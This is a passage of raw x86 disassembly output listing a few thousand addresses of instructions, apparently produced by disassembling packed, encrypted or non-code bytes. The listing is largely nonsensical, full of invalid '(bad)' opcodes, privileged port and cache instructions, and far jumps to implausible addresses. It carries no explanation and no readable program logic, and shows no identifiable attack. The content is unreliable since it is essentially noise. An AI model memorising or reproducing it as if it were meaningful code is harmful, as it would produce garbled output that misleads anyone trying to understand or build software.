  41816e:	add    al,0xd5
  418170:	loop   0x4180fc
  418172:	push   esi
  418173:	xchg   BYTE PTR [edx],bh
  418175:	mov    dh,0xa6
  418177:	stos   DWORD PTR es:[edi],eax
  418178:	test   BYTE PTR [eax+0x6ea13927],0x8b
  41817f:	jge    0x4181b6
  418181:	xor    esi,esp
  418183:	mov    ah,0x94
  418185:	addr16 test eax,0x82add746
  41818b:	push   edi
  41818c:	mov    ecx,0x6f5dd19b
  418191:	aas    
  418192:	js     0x4181b0
  418194:	push   0x6c
  418196:	shl    BYTE PTR [ecx+ecx*4],1
  418199:	stos   BYTE PTR es:[edi],al
  41819a:	mov    esi,0x70de4169
  41819f:	dec    edx
  4181a0:	sbb    al,0x60
  4181a2:	or     BYTE PTR [ecx-0x57],bl
  4181a5:	jge    0x418163
  4181a7:	lock das 
  4181a9:	fucomi st,st(0)
  4181ab:	jle    0x41816d
  4181ad:	loop   0x41814d
  4181af:	push   ss
  4181b0:	push   ecx
  4181b1:	and    eax,0xf0ab340b
  4181b6:	or     eax,0xcd97b7e7
  4181bb:	out    dx,eax
  4181bc:	leave  
  4181bd:	xor    DWORD PTR [eax],ecx
  4181bf:	push   edx
  4181c0:	dec    esi
  4181c1:	leave  
  4181c2:	fwait
  4181c3:	add    al,0x5f
  4181c5:	inc    ebx
  4181c6:	mov    al,0xd2
  4181c8:	add    dh,BYTE PTR [ebx]
  4181ca:	aas    
  4181cb:	xchg   esi,eax
  4181cc:	out    0x9a,eax
  4181ce:	lea    edx,[ebx]
  4181d0:	cmc    
  4181d1:	adc    edi,ebp
  4181d3:	cmp    al,0xb8
  4181d5:	pop    es
  4181d6:	or     DWORD PTR [esi-0x3],0x5f8f8581
  4181dd:	les    ebx,FWORD PTR [eax-0x27]
  4181e0:	xchg   BYTE PTR [esp+esi*8],dl
  4181e3:	neg    DWORD PTR [ebp+eax*8+0x2d531bb3]
  4181ea:	repnz cmc 
  4181ec:	rol    esi,cl
  4181ee:	mov    ah,0xdb
  4181f0:	pop    es
  4181f1:	inc    ecx
  4181f2:	gs or  al,0x6a
  4181f5:	int3   
  4181f6:	push   DWORD PTR [edi+0x5]
  4181f9:	and    DWORD PTR [ecx+0x8b6cf66],0x24
  418200:	mov    ds:0x2ba1c3cf,eax
  418205:	and    eax,0x666820f2
  41820a:	push   esi
  41820b:	rcr    DWORD PTR [edx],1
  41820d:	xchg   DWORD PTR [ecx-0x6c808728],ebx
  418213:	mov    esi,0xb2766b63
  418218:	pusha  
  418219:	jno    0x4181de
  41821b:	test   BYTE PTR [esi+0x5b],dh
  41821e:	cmp    DWORD PTR [ecx-0x2390d5fe],0x41ad1c3f
  418228:	jle    0x41827b
  41822a:	ds inc ebp
  41822c:	push   ds
  41822d:	jmp    0x27854ea4
  418232:	sbb    al,0xd5
  418234:	js     0x4181e8
  418236:	popf   
  418237:	jg     0x4182b1
  418239:	mov    ebp,0xcac2cc71
  41823e:	cli    
  41823f:	in     al,0xe1
  418241:	and    eax,DWORD PTR [esi+0x69801f36]
  418247:	sbb    al,0x92
  418249:	add    ecx,DWORD PTR [eax-0x2b60921e]
  41824f:	cmp    edx,DWORD PTR [edi+0x52ff988b]
  418255:	xor    al,0xa
  418257:	sub    BYTE PTR [ecx+edi*8-0x56a48710],bl
  41825e:	rcr    DWORD PTR [edx-0x72],cl
  418261:	xchg   BYTE PTR [esi-0x3c7ff9e8],dh
  418267:	fwait
  418268:	ret    
  418269:	ss jp  0x41828b
  41826c:	rol    DWORD PTR [edx-0x3c],cl
  41826f:	sbb    DWORD PTR [eax-0x1dcd1149],eax
  418275:	sub    dl,BYTE PTR [edx]
  418277:	lea    eax,[ebx+0x6d]
  41827a:	pusha  
  41827b:	enter  0xa345,0x16
  41827f:	clc    
  418280:	iret   
  418281:	fwait
  418282:	and    al,0xae
  418284:	call   0x5d0dd432
  418289:	lahf   
  41828a:	fld    DWORD PTR [edx+0x75698d1f]
  418290:	scas   eax,DWORD PTR es:[edi]
  418291:	jne    0x418234
  418293:	add    BYTE PTR ds:0x1efe351a,dh
  418299:	shl    ch,0xf0
  41829c:	sub    al,0x6c
  41829e:	mov    ds:0x45cab8f,eax
  4182a3:	iret   
  4182a4:	not    DWORD PTR [edi+0x54b9d453]
  4182aa:	pop    esp
  4182ab:	(bad)  
  4182ac:	cli    
  4182ad:	inc    ebx
  4182ae:	push   cs
  4182af:	js     0x41831f
  4182b1:	lods   eax,DWORD PTR ds:[esi]
  4182b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182b3:	xor    BYTE PTR [edi],ah
  4182b5:	push   0xffffffc8
  4182b7:	mov    ds:0x515f76fb,al
  4182bc:	std    
  4182bd:	mov    dl,0x41
  4182bf:	xor    al,dl
  4182c1:	jle    0x4182cf
  4182c3:	inc    edi
  4182c4:	mov    al,ds:0x1b9d5d84
  4182c9:	jbe    0x41827d
  4182cb:	push   ecx
  4182cc:	xchg   esi,eax
  4182cd:	ins    BYTE PTR es:[edi],dx
  4182ce:	mov    es,WORD PTR [eax+esi*2+0x36]
  4182d2:	or     BYTE PTR [eax-0x65],ah
  4182d5:	push   ebx
  4182d6:	sar    DWORD PTR [edx],0x33
  4182d9:	add    eax,0xc8b39ba9
  4182de:	xor    DWORD PTR [eax+0x74],eax
  4182e1:	xchg   ebp,eax
  4182e2:	loopne 0x418265
  4182e4:	jge    0x418319
  4182e6:	sbb    DWORD PTR [edi+ebp*4+0x790db21c],ebp
  4182ed:	mov    edx,0x12b0ed23
  4182f2:	in     al,dx
  4182f3:	cmp    ebp,esp
  4182f5:	test   DWORD PTR [ecx],eax
  4182f7:	jo     0x4182f7
  4182f9:	lods   al,BYTE PTR ds:[esi]
  4182fa:	call   FWORD PTR ds:[ebx+0x5acc492]
  418301:	in     al,dx
  418302:	dec    esp
  418303:	je     0x418381
  418305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418306:	push   0xfffffffd
  418308:	cdq    
  418309:	cld    
  41830a:	loope  0x4182e3
  41830c:	fisub  DWORD PTR [esi-0x28a26a19]
  418312:	js     0x4182ee
  418314:	lea    edx,[ecx-0x63]
  418317:	rcr    BYTE PTR [edx+0x728da986],0x71
  41831e:	bound  edi,QWORD PTR [esi+0x22]
  418321:	mov    WORD PTR [ebx-0x995b204],?
  418327:	cmp    eax,DWORD PTR [edi]
  418329:	sub    bl,BYTE PTR [edi+ecx*1+0x15dc5d87]
  418330:	ds add al,0xec
  418333:	and    DWORD PTR [ecx-0x5e0e5241],ebx
  418339:	stc    
  41833a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41833c:	test   bl,bl
  41833e:	lods   al,BYTE PTR ds:[esi]
  41833f:	mov    bl,0x9f
  418341:	dec    esp
  418342:	mov    bh,0x7d
  418344:	mov    DWORD PTR [eax+0x9],0xcaf8a4bc
  41834b:	shl    DWORD PTR [edi+0x2f69da8b],cl
  418351:	and    BYTE PTR [ebx-0x27],bl
  418354:	icebp  
  418355:	adc    DWORD PTR [edi],ebp
  418357:	stos   DWORD PTR es:[edi],eax
  418358:	or     BYTE PTR [ecx+ebx*2-0x2],al
  41835c:	mov    dl,0x82
  41835e:	repnz jmp 0x969a:0xd7062a61
  418366:	sub    ah,BYTE PTR [esi]
  418368:	enter  0x16d2,0x5a
  41836c:	jecxz  0x4182f2
  41836e:	xor    ebp,DWORD PTR [esp+ecx*8-0x2a4c0865]
  418375:	pusha  
  418376:	inc    ebp
  418377:	xlat   BYTE PTR ds:[ebx]
  418378:	in     al,dx
  418379:	inc    ebp
  41837a:	jp     0x4183e7
  41837c:	and    eax,0xa32b20ca
  418381:	dec    eax
  418382:	inc    edx
  418383:	aaa    
  418384:	mov    dl,0x40
  418386:	push   esi
  418387:	xchg   ebx,eax
  418388:	pop    es
  418389:	gs (bad) 
  41838c:	test   dl,al
  41838e:	jb     0x418353
  418390:	xchg   BYTE PTR [esi-0x2e],ah
  418393:	push   0xd6c9c323
  418398:	mov    dl,BYTE PTR [eax+edi*8+0xd76e976]
  41839f:	and    DWORD PTR [ebx+0x7c],ebx
  4183a2:	test   BYTE PTR [eax+0x71],dh
  4183a5:	pop    ebp
  4183a6:	mov    ah,0x8
  4183a8:	gs clc 
  4183aa:	or     BYTE PTR [esi-0x25a25f46],dh
  4183b0:	dec    eax
  4183b1:	inc    ebp
  4183b2:	retf   0xea63
  4183b5:	adc    BYTE PTR [edx-0x53],dh
  4183b8:	out    dx,al
  4183b9:	jns    0x418419
  4183bb:	or     eax,0x129294b8
  4183c0:	jle    0x418381
  4183c2:	jmp    0x4f1136ed
  4183c7:	std    
  4183c8:	push   edi
  4183c9:	xchg   DWORD PTR [edi],esi
  4183cb:	popf   
  4183cc:	cmp    dl,0xba
  4183cf:	xlat   BYTE PTR ds:[ebx]
  4183d0:	or     ebx,DWORD PTR [ecx]
  4183d2:	inc    ebp
  4183d3:	mov    ds:0x13114875,eax
  4183d8:	popa   
  4183d9:	rol    BYTE PTR [ebp+0x57],cl
  4183dc:	arpl   WORD PTR [esi],cx
  4183de:	enter  0x97cd,0x89
  4183e2:	xchg   ebx,eax
  4183e3:	jg     0x4183f2
  4183e5:	pop    edx
  4183e6:	dec    edi
  4183e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183e8:	mov    esi,0x6acb8281
  4183ed:	push   esi
  4183ee:	popf   
  4183ef:	out    0xea,eax
  4183f1:	shl    BYTE PTR [ecx-0x53],cl
  4183f4:	push   ebp
  4183f5:	jno    0x41843d
  4183f7:	cwde   
  4183f8:	jp     0x4183a4
  4183fa:	sub    BYTE PTR [edi+0x69fe365b],ah
  418400:	fnstcw WORD PTR [ebp+0xcb44eb5]
  418406:	das    
  418407:	xlat   BYTE PTR ds:[ebx]
  418408:	sbb    BYTE PTR [edx],ch
  41840a:	arpl   WORD PTR [ebp+0x42],ax
  41840d:	pop    ebx
  41840e:	add    bh,BYTE PTR [eax+0x6ace46ff]
  418414:	jecxz  0x41840b
  418416:	or     eax,0x5e932e59
  41841b:	mov    cl,0x5a
  41841d:	xchg   DWORD PTR [ebx-0x11],ebx
  418420:	fsubr  DWORD PTR [eax]
  418422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418423:	inc    eax
  418424:	and    dh,BYTE PTR [ecx+0x2e]
  418427:	rcl    DWORD PTR [eax+0x6c],cl
  41842a:	mov    ebp,0x28fc30a4
  41842f:	xchg   edi,eax
  418430:	mov    dl,BYTE PTR ds:0x9fe87293
  418436:	das    
  418437:	das    
  418438:	cs push eax
  41843a:	mov    WORD PTR [ebp-0x537a108],cs
  418440:	sub    al,0x18
  418442:	stos   DWORD PTR es:[edi],eax
  418443:	scas   al,BYTE PTR es:[edi]
  418444:	imul   eax,DWORD PTR [ebp-0x19],0xffffff9c
  418448:	dec    esi
  418449:	mov    ch,0x66
  41844b:	sub    DWORD PTR fs:[ebp+0x67],edi
  41844f:	push   DWORD PTR [edx]
  418451:	scas   al,BYTE PTR es:[edi]
  418452:	sti    
  418453:	xchg   esp,eax
  418454:	jo     0x4183de
  418456:	imul   esi
  418458:	mov    dl,0x50
  41845a:	sub    bl,ah
  41845c:	inc    ebx
  41845d:	pop    esp
  41845e:	push   0xffffffb8
  418460:	into   
  418461:	dec    ebx
  418462:	stos   DWORD PTR es:[edi],eax
  418463:	sahf   
  418464:	popf   
  418465:	in     al,dx
  418466:	mov    edi,0x30e1f709
  41846b:	(bad)  
  41846d:	lods   eax,DWORD PTR ds:[esi]
  41846e:	test   DWORD PTR [ebx],edx
  418470:	sbb    esp,ebp
  418472:	fisttp QWORD PTR [ecx-0x61]
  418475:	aaa    
  418476:	icebp  
  418477:	nop
  418478:	ss mov ebp,0xf8926106
  41847e:	dec    edi
  41847f:	enter  0xe28e,0xb8
  418483:	retf   
  418484:	push   ebp
  418485:	sbb    BYTE PTR [ecx+0x581dbad2],al
  41848b:	ins    DWORD PTR es:[edi],dx
  41848c:	das    
  41848d:	scas   eax,DWORD PTR es:[edi]
  41848e:	sbb    DWORD PTR ds:0x4241ad4e,esp
  418494:	and    eax,0xe07bb090
  418499:	je     0x418485
  41849b:	aam    0x8e
  41849d:	dec    ecx
  41849e:	dec    ebp
  41849f:	invd   
  4184a1:	call   0x208a:0x99b45d9f
  4184a8:	ror    BYTE PTR [esi+0x59],0x59
  4184ac:	jns    0x418484
  4184ae:	jnp    0x41852a
  4184b0:	out    0x5a,eax
  4184b2:	xor    eax,0xab89d453
  4184b7:	jo     0x41846b
  4184b9:	cmp    esi,DWORD PTR [edx]
  4184bb:	aad    0x99
  4184bd:	lods   eax,DWORD PTR ds:[esi]
  4184be:	xchg   esp,eax
  4184bf:	jecxz  0x41848a
  4184c1:	jge    0x4184bd
  4184c3:	lods   al,BYTE PTR ds:[esi]
  4184c4:	or     al,0xfd
  4184c6:	(bad)  
  4184c8:	push   ss
  4184c9:	sbb    DWORD PTR [ebp+ebp*4-0x4a6dfcf0],esi
  4184d0:	ss sbb eax,0x97c9f01
  4184d6:	cdq    
  4184d7:	les    edi,FWORD PTR [ecx-0x2b5c422d]
  4184dd:	lahf   
  4184de:	mov    ah,0xb3
  4184e0:	mov    esp,0xad59e0a8
  4184e5:	lea    ebx,ds:0xb6a250a4
  4184eb:	gs cmp ecx,ebx
  4184ee:	mov    bh,0x72
  4184f0:	sbb    ah,BYTE PTR [edx-0x56945aec]
  4184f6:	ds stos DWORD PTR es:[edi],eax
  4184f8:	mov    ecx,0xaae76e8b
  4184fd:	and    DWORD PTR [ebp+0x273d2026],edi
  418503:	and    DWORD PTR [edi+0x126a2d0a],ecx
  418509:	cmp    esi,0x3c
  41850c:	dec    esi
  41850d:	xor    eax,0xd221a1bf
  418512:	xor    DWORD PTR [edx],0xffffff94
  418515:	dec    ebp
  418516:	sub    bh,BYTE PTR [ecx-0x255b5d71]
  41851c:	dec    edx
  41851d:	cwde   
  41851e:	outs   dx,BYTE PTR ds:[esi]
  41851f:	push   ds
  418520:	scas   al,BYTE PTR es:[edi]
  418521:	std    
  418522:	dec    ebx
  418523:	test   DWORD PTR [ebx+0x2],0xed99cb56
  41852a:	adc    esp,DWORD PTR [edi-0x80]
  41852d:	sbb    al,0x1f
  41852f:	outs   dx,BYTE PTR ds:[esi]
  418530:	pushf  
  418531:	int3   
  418532:	jecxz  0x41851d
  418534:	in     al,0x77
  418536:	mov    ch,BYTE PTR [ecx+0x40]
  418539:	stos   BYTE PTR es:[edi],al
  41853a:	popa   
  41853b:	popa   
  41853c:	cmp    eax,edi
  41853e:	jae    0x418577
  418540:	mov    ecx,DWORD PTR [ecx-0x2f]
  418543:	repnz xlat BYTE PTR ds:[ebx]
  418545:	mov    al,ds:0xad354f50
  41854a:	add    DWORD PTR [ebp+0x46],0x19de9f0
  418551:	xchg   ecx,eax
  418552:	jl     0x41853c
  418554:	std    
  418555:	fisubr DWORD PTR [ecx+0x5fdfdb61]
  41855b:	cs ins BYTE PTR es:[edi],dx
  41855d:	mov    al,ds:0x3efa2d23
  418562:	dec    eax
  418563:	fs jne 0x4185d7
  418566:	not    DWORD PTR [eax+0x69]
  418569:	sbb    DWORD PTR [edx-0x3efde41e],edi
  41856f:	ins    BYTE PTR es:[edi],dx
  418570:	pop    ebx
  418571:	jb     0x41852b
  418573:	lds    esp,FWORD PTR [edx]
  418575:	dec    esi
  418576:	sub    eax,0x4e29c3f2
  41857b:	ja     0x4185a9
  41857d:	and    edx,esi
  41857f:	loopne 0x418576
  418581:	mov    eax,ds:0xc0bfdf01
  418586:	(bad)  
  418587:	mov    dl,0xc0
  418589:	sbb    BYTE PTR [edi-0x55],ah
  41858c:	loop   0x418585
  41858e:	stc    
  41858f:	and    eax,0x5fb06c65
  418594:	mov    esi,0xbd161a82
  418599:	fcomp  QWORD PTR [ebp-0x3c]
  41859c:	mov    esp,0x45038368
  4185a1:	out    0x80,al
  4185a3:	repnz loope 0x418617
  4185a6:	sbb    eax,0xa4e78791
  4185ab:	xor    dh,BYTE PTR [ebp+0x4b]
  4185ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185af:	addr16 cmp eax,0x97258516
  4185b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185b6:	adc    DWORD PTR [ebx+0x5ff28ff1],ebp
  4185bc:	ret    
  4185bd:	pop    ebx
  4185be:	std    
  4185bf:	scas   eax,DWORD PTR es:[edi]
  4185c0:	jbe    0x4185ed
  4185c2:	adc    al,BYTE PTR [eax+0x7]
  4185c5:	pop    edx
  4185c6:	pop    es
  4185c7:	pop    edx
  4185c8:	ret    0x11cc
  4185cb:	adc    ecx,DWORD PTR [ecx+0x2dcb5c7e]
  4185d1:	(bad)  
  4185d2:	jns    0x418593
  4185d4:	outs   dx,DWORD PTR ds:[esi]
  4185d5:	sbb    eax,0xed39ade6
  4185da:	adc    edi,ecx
  4185dc:	test   al,0x47
  4185de:	aad    0xa5
  4185e0:	lods   al,BYTE PTR ds:[esi]
  4185e1:	sbb    dh,dl
  4185e3:	cli    
  4185e4:	inc    esp
  4185e5:	add    BYTE PTR [edi],0xe5
  4185e8:	shl    BYTE PTR [eax-0x56d5e699],1
  4185ee:	cwde   
  4185ef:	pop    edx
  4185f0:	mov    WORD PTR [edi+0x2bbe4e1],ds
  4185f6:	mov    ebx,0xfb9d3033
  4185fb:	push   ecx
  4185fc:	cdq    
  4185fd:	and    bl,BYTE PTR [ecx+edi*8]
  418600:	jnp    0x418636
  418602:	arpl   WORD PTR [eax+0x457e574e],bx
  418608:	scas   eax,DWORD PTR es:[edi]
  418609:	pop    ss
  41860a:	pushf  
  41860b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41860c:	mov    ebp,0x30af2219
  418611:	xchg   ecx,eax
  418612:	cld    
  418613:	dec    ebx
  418614:	fprem  
  418616:	mov    edi,0x754335cc
  41861b:	mov    edx,0x5af8d4fe
  418620:	inc    eax
  418621:	pop    esp
  418622:	das    
  418623:	pop    ecx
  418624:	pusha  
  418625:	mov    ah,0xe
  418627:	cdq    
  418628:	mov    ecx,0xde50d662
  41862d:	(bad)  
  41862e:	in     al,0x4f
  418630:	clc    
  418631:	loop   0x4185b3
  418633:	jmp    0x4a2f63ff
  418638:	mov    BYTE PTR [eax-0x4088d6e4],ch
  41863e:	add    BYTE PTR [edi-0x7f35ff22],dh
  418644:	mov    ecx,0xce7cafcb
  418649:	mov    dl,0x88
  41864b:	call   0x1dc1:0x34e4603c
  418652:	clc    
  418653:	xor    esi,DWORD PTR [eax]
  418655:	sbb    DWORD PTR [edi-0x7b],esi
  418658:	sbb    eax,edx
  41865a:	repz mov eax,0xa33fb0f7
  418660:	add    al,0xba
  418662:	or     al,0xb4
  418664:	outs   dx,DWORD PTR ds:[esi]
  418665:	bound  edx,QWORD PTR [ecx]
  418667:	and    bl,bh
  418669:	add    al,ch
  41866b:	sbb    ebx,DWORD PTR [edx]
  41866d:	and    ebp,DWORD PTR [edi-0x3f]
  418670:	or     eax,0x6824bec2
  418675:	bnd jnp 0x41864e
  418678:	dec    ebp
  418679:	mov    al,ds:0x5113af0b
  41867e:	out    dx,eax
  41867f:	sub    edx,DWORD PTR [ebx]
  418681:	xor    al,0x76
  418683:	cli    
  418684:	retf   
  418685:	sbb    esp,esp
  418687:	mov    ecx,0x3950c0c8
  41868c:	adc    bh,BYTE PTR [edx+ebp*2+0x36ada620]
  418693:	out    dx,al
  418694:	and    ah,al
  418696:	sub    bl,BYTE PTR [ebx+0x37]
  418699:	aas    
  41869a:	pop    ebx
  41869b:	fst    DWORD PTR [esi]
  41869d:	push   es
  41869e:	sti    
  41869f:	sbb    al,0xe4
  4186a1:	dec    ebx
  4186a2:	or     ch,BYTE PTR [edx+0x3f]
  4186a5:	in     eax,dx
  4186a6:	and    esi,DWORD PTR [eax+0x1d]
  4186a9:	add    BYTE PTR [esi-0x1a449bd3],ch
  4186af:	arpl   WORD PTR [eax],cx
  4186b1:	jg     0x4186e6
  4186b3:	adc    BYTE PTR [esi],ah
  4186b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186b6:	mov    cl,0x74
  4186b8:	cmp    BYTE PTR [edi+0x2dc4b071],dh
  4186be:	mov    esi,0xa8bd93b6
  4186c3:	(bad)  
  4186c4:	dec    esi
  4186c5:	les    esp,FWORD PTR [ebp+0x596766a0]
  4186cb:	push   edi
  4186cc:	mov    ebp,0xd5954291
  4186d1:	pop    esp
  4186d2:	xor    al,0xbd
  4186d4:	shr    BYTE PTR [eax+0x6709c28f],0xe7
  4186db:	sub    DWORD PTR [eax+0x128b09fd],eax
  4186e1:	add    ebx,DWORD PTR [edi+0x7d75d5b9]
  4186e7:	(bad)  
  4186e8:	out    0x78,eax
  4186ea:	mov    al,ds:0xf6e32020
  4186ef:	and    DWORD PTR [ebx+ebx*1-0x421a97ed],esp
  4186f6:	sbb    eax,0xd5a9255f
  4186fb:	adc    DWORD PTR ds:0x8b3d3b0f,ecx
  418701:	and    cl,BYTE PTR [edi-0x22f961e5]
  418707:	aam    0x1b
  418709:	or     eax,DWORD PTR [edi+esi*1]
  41870c:	add    ecx,DWORD PTR [eax+0x7596c975]
  418712:	lds    edi,FWORD PTR [edi+0x737826d1]
  418718:	jo     0x418718
  41871a:	scas   al,BYTE PTR es:[edi]
  41871b:	ret    0x2b4e
  41871e:	add    al,0xe6
  418720:	fild   QWORD PTR [ecx+0x0]
  418723:	xor    al,0x67
  418725:	(bad)  
  418727:	sti    
  418728:	mov    ds:0x321905d4,eax
  41872d:	imul   esi,DWORD PTR [edi-0x7a466be3],0x5f4889b8
  418737:	or     cl,dh
  418739:	pop    ebx
  41873a:	enter  0x1a22,0xff
  41873e:	mov    ebx,0x970c39f9
  418743:	push   ebp
  418744:	adc    esi,ebp
  418746:	add    dh,dl
  418748:	pop    edi
  418749:	pop    ss
  41874a:	xchg   dl,dh
  41874c:	or     eax,0xc33ccc3c
  418751:	arpl   WORD PTR [ebp+0x7a02cdcc],ax
  418757:	stos   BYTE PTR es:[edi],al
  418758:	inc    edx
  418759:	rcr    DWORD PTR [esi],1
  41875b:	es pusha 
  41875d:	retf   0xfb65
  418760:	mov    al,0x7f
  418762:	pop    ds
  418763:	mov    edi,0xe992746b
  418768:	xor    ch,dl
  41876a:	cmc    
  41876b:	mov    ds,WORD PTR [ecx+esi*1+0x69f21aba]
  418772:	adc    dh,BYTE PTR [ebx]
  418774:	stc    
  418775:	cwde   
  418776:	inc    eax
  418777:	loope  0x4187d2
  418779:	data16 xor BYTE PTR [esp+ebp*2],ah
  41877d:	sbb    ebx,esi
  41877f:	inc    eax
	...
  418954:	(bad)  
  418955:	stc    
  418956:	out    0xe3,eax
  418958:	(bad)  
  418959:	inc    edi
  41895b:	std    
  41895c:	fidivr WORD PTR [ebx]
  41895e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41895f:	dec    esp
  418960:	lock cmc 
  418962:	jl     0x41891c
  418964:	xlat   BYTE PTR ds:[ebx]
  418965:	mov    ebp,0x71e0001
  41896a:	add    BYTE PTR [eax],al
  41896c:	icebp  
  41896d:	mov    al,0xe7
  41896f:	ret    
  418970:	dec    ecx
  418971:	and    dl,BYTE PTR [edi-0x4b8854ee]
  418977:	mov    cl,0x47
  418979:	mov    ecx,0xe51143d7
  41897e:	adc    BYTE PTR [edx],0x84
  418981:	nop/reserved BYTE PTR [ebp+0x370d98d9]
  418988:	push   0x3a6ad122
  41898d:	popa   
  41898e:	retf   0x31e6
  418991:	push   esi
  418992:	test   eax,0xbe34a7d0
  418997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418998:	sar    dh,0x13
  41899b:	icebp  
  41899c:	call   0xfa317eff
  4189a1:	loope  0x41897c
  4189a3:	loopne 0x418958
  4189a5:	call   0xbf43:0xecb6e8e9
  4189ac:	jbe    0x418968
  4189ae:	pop    ss
  4189af:	pop    esi
  4189b0:	inc    esi
  4189b1:	cmp    ebp,DWORD PTR [edi]
  4189b3:	xchg   edx,eax
  4189b4:	inc    edx
  4189b5:	jmp    0x1a1f:0x2decc34b
  4189bc:	mov    ah,0xd4
  4189be:	sahf   
  4189bf:	fs cli 
  4189c1:	ret    
  4189c2:	(bad)  
  4189c4:	scas   al,BYTE PTR es:[edi]
  4189c5:	add    DWORD PTR [edi-0x6f00b142],ecx
  4189cb:	es pop eax
  4189cd:	push   ss
  4189ce:	(bad)  
  4189cf:	push   esp
  4189d0:	mov    al,0xbb
  4189d2:	mov    DWORD PTR [edi+0xc],eax
  4189d5:	cmp    bl,cl
  4189d7:	inc    ebx
  4189d8:	cs xchg ebp,eax
  4189da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189db:	xchg   esi,eax
  4189dc:	arpl   WORD PTR [edi-0x28],sp
  4189df:	dec    BYTE PTR ds:0x7d8675ff
  4189e5:	es and ah,dh
  4189e8:	fcmovb st,st(3)
  4189ea:	nop
  4189eb:	push   0xcf3e551a
  4189f0:	sbb    BYTE PTR [esi-0x14],bl
  4189f3:	pop    ecx
  4189f4:	sbb    esi,ecx
  4189f6:	dec    edx
  4189f7:	lahf   
  4189f8:	jmp    0x2321b1a6
  4189fd:	icebp  
  4189fe:	and    edi,DWORD PTR [eax]
  418a00:	mov    edx,0x603d3022
  418a05:	cld    
  418a06:	xchg   edi,eax
  418a07:	jae    0x4189d6
  418a09:	cmp    eax,0xaa95a3b3
  418a0e:	jae    0x418a1a
  418a10:	gs retf 
  418a12:	mov    edi,DWORD PTR [edi]
  418a14:	ret    
  418a15:	adc    eax,0x41e35006
  418a1a:	jnp    0x418a5a
  418a1c:	pop    esp
  418a1d:	mov    al,ch
  418a1f:	in     eax,0x51
  418a21:	retf   
  418a22:	ficom  DWORD PTR [edi+0x5ac5358e]
  418a28:	xor    eax,0x92419e3f
  418a2d:	push   esp
  418a2e:	icebp  
  418a2f:	sub    edx,ebx
  418a31:	lods   eax,DWORD PTR ds:[esi]
  418a32:	sub    ebp,DWORD PTR [esi-0x47c3061]
  418a38:	stc    
  418a39:	mov    ah,0x77
  418a3b:	loopne 0x418a07
  418a3d:	in     eax,dx
  418a3e:	test   DWORD PTR [edi+0x2b6cfac7],ebp
  418a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a45:	cli    
  418a46:	mov    edi,cs
  418a48:	std    
  418a49:	mov    al,BYTE PTR [ebx+0x2f876bab]
  418a4f:	mov    al,0x49
  418a51:	adc    eax,0xabbf325
  418a56:	sub    BYTE PTR [ecx-0x5674f19c],al
  418a5c:	jl     0x418a29
  418a5e:	adc    eax,0x68dc5391
  418a63:	das    
  418a64:	or     DWORD PTR [edx],0xffffffcd
  418a67:	mov    edi,ss
  418a69:	jmp    0xa4c3:0x24913e1e
  418a70:	lock add DWORD PTR [edi],0xffffffdc
  418a74:	mov    ds,WORD PTR [edx+0x44]
  418a77:	pop    ecx
  418a78:	lods   al,BYTE PTR ds:[esi]
  418a79:	add    al,0x56
  418a7b:	out    dx,eax
  418a7c:	sahf   
  418a7d:	mov    ebx,0x20d98d5d
  418a82:	sub    BYTE PTR [ebp+0x5d],dl
  418a85:	test   dl,bh
  418a87:	shl    ecx,cl
  418a89:	mov    ebp,0x88975082
  418a8e:	ins    DWORD PTR es:[edi],dx
  418a8f:	mov    dh,0x96
  418a91:	clc    
  418a92:	cmc    
  418a93:	or     ch,dh
  418a95:	fisttp WORD PTR [esi]
  418a97:	lods   al,BYTE PTR ds:[esi]
  418a98:	dec    ebp
  418a99:	or     BYTE PTR [eax+0x73],bl
  418a9c:	test   eax,0x20a01810
  418aa1:	jnp    0x418a6a
  418aa3:	cmp    ecx,DWORD PTR [esi]
  418aa5:	jl     0x418a43
  418aa7:	data16 jae 0x418a62
  418aaa:	popf   
  418aab:	sbb    al,0x68
  418aad:	sub    al,0xf
  418aaf:	jl     0x418ae0
  418ab1:	mov    ebx,0x93ac4eb1
  418ab6:	push   es
  418ab7:	aas    
  418ab8:	out    dx,eax
  418ab9:	push   0xa424c00d
  418abe:	fs inc esi
  418ac0:	and    eax,0x7590b937
  418ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac6:	out    dx,eax
  418ac7:	inc    edx
  418ac8:	fmul   QWORD PTR [edi]
  418aca:	adc    eax,0xa958bf19
  418acf:	mov    esi,esp
  418ad1:	xor    BYTE PTR [esi],bh
  418ad3:	inc    edi
  418ad4:	in     al,dx
  418ad5:	mov    esi,0xcf68ccd2
  418ada:	pop    ebp
  418adb:	fwait
  418adc:	add    esp,DWORD PTR [esp+ebp*2]
  418adf:	lock jae 0x418ab3
  418ae2:	stos   BYTE PTR es:[edi],al
  418ae3:	pop    esi
  418ae4:	push   0x7926b2b0
  418ae9:	sbb    BYTE PTR [ecx+0x1e],dh
  418aec:	mov    bl,0x56
  418aee:	cmc    
  418aef:	pushf  
  418af0:	aaa    
  418af1:	jge    0x418a7b
  418af3:	fs cmp al,0xd7
  418af6:	dec    edx
  418af8:	inc    esp
  418af9:	loop   0x418b12
  418afb:	jle    0x418ac2
  418afd:	push   edi
  418afe:	clc    
  418aff:	mov    edx,0xc47eeee1
  418b04:	ja     0x418b1f
  418b06:	or     BYTE PTR [ebp-0x2ded264f],cl
  418b0c:	test   BYTE PTR [ebp+0x27],cl
  418b0f:	pop    esi
  418b10:	js     0x418ad7
  418b12:	dec    esp
  418b13:	test   DWORD PTR [ecx+0x2f82fe44],edi
  418b19:	aaa    
  418b1a:	push   ecx
  418b1b:	jp     0x418b43
  418b1d:	inc    ecx
  418b1e:	or     ecx,DWORD PTR [edx]
  418b20:	jge    0x418abd
  418b22:	pop    ecx
  418b23:	sahf   
  418b24:	xor    BYTE PTR [edx+0x7848e21a],bh
